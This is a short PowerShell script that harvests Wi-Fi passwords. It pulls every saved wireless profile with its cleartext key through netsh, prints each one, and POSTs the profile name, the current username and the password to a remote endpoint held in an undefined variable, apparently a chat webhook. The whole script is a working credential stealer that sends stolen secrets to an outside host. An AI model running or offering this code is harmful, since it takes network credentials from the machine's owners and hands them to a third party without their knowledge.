netsh wlan show profile | ForEach-Object {
    if ($_ -match 'All User Profile\s*:\s*(.+)') {
        $w = $matches[1]

        $p = (netsh wlan show profile name="$w" key=clear | Select-String 'Key Content\s*:\s*(.+)').Matches.Groups[1].Value

        Write-Output "Profile: $w, Password: $p"

        if (-not [string]::IsNullOrEmpty($p)) {
            $msg = @{
                username = "$env:username | $w"
                content  = $p
            }

            try {
                Invoke-RestMethod -Uri $d -Method Post -Body ($msg | ConvertTo-Json -Depth 2)
            } catch {
                Write-Output "Failed to send message for profile: $w. Error: $_"
            }

            Start-Sleep -Milliseconds 100
        }
    }
}
